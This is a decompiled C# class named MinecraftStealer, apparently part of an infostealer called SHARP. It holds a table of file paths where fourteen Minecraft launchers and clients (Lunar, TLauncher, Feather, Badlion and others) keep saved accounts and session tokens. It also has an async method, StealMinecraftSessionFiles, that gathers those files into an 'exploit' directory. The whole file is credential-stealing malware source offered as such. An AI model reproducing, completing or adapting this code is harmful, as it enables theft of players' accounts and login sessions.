﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x0200005F RID: 95
	internal static class MinecraftStealer
	{
		// Token: 0x06000214 RID: 532 RVA: 0x0000CD38 File Offset: 0x0000AF38
		static MinecraftStealer()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string environmentVariable = Environment.GetEnvironmentVariable("userprofile");
			MinecraftStealer._minecraftFolderPaths = new Dictionary<string, string>
			{
				{
					"Intent",
					Path.Combine(environmentVariable, "intentlauncher", "launcherconfig")
				},
				{
					"Lunar",
					Path.Combine(new string[]
					{
						environmentVariable,
						".lunarclient",
						"settings",
						"game",
						"accounts.json"
					})
				},
				{
					"TLauncher",
					Path.Combine(folderPath, ".minecraft", "TlauncherProfiles.json")
				},
				{
					"Feather",
					Path.Combine(folderPath, ".feather", "accounts.json")
				},
				{
					"Meteor",
					Path.Combine(folderPath, ".minecraft", "meteor-client", "accounts.nbt")
				},
				{
					"Impact",
					Path.Combine(folderPath, ".minecraft", "Impact", "alts.json")
				},
				{
					"Novoline",
					Path.Combine(folderPath, ".minectaft", "Novoline", "alts.novo")
				},
				{
					"CheatBreakers",
					Path.Combine(folderPath, ".minecraft", "cheatbreaker_accounts.json")
				},
				{
					"Microsoft Store",
					Path.Combine(folderPath, ".minecraft", "launcher_accounts_microsoft_store.json")
				},
				{
					"Rise",
					Path.Combine(folderPath, ".minecraft", "Rise", "alts.txt")
				},
				{
					"Rise (Intent)",
					Path.Combine(environmentVariable, "intentlauncher", "Rise", "alts.txt")
				},
				{
					"Paladium",
					Path.Combine(folderPath, "paladium-group", "accounts.json")
				},
				{
					"PolyMC",
					Path.Combine(folderPath, "PolyMC", "accounts.json")
				},
				{
					"Badlion",
					Path.Combine(folderPath, "Badlion Client", "accounts.json")
				}
			};
		}

		// Token: 0x06000215 RID: 533 RVA: 0x0000CF18 File Offset: 0x0000B118
		internal static Task<int> StealMinecraftSessionFiles(string exploitDir)
		{
			MinecraftStealer.<StealMinecraftSessionFiles>d__2 <StealMinecraftSessionFiles>d__;
			<StealMinecraftSessionFiles>d__.<>t__builder = AsyncTaskMethodBuilder<int>.Create();
			<StealMinecraftSessionFiles>d__.exploitDir = exploitDir;
			<StealMinecraftSessionFiles>d__.<>1__state = -1;
			<StealMinecraftSessionFiles>d__.<>t__builder.Start<MinecraftStealer.<StealMinecraftSessionFiles>d__2>(ref <StealMinecraftSessionFiles>d__);
			return <StealMinecraftSessionFiles>d__.<>t__builder.Task;
		}

		// Token: 0x0400011F RID: 287
		private static readonly Dictionary<string, string> _minecraftFolderPaths;
	}
}
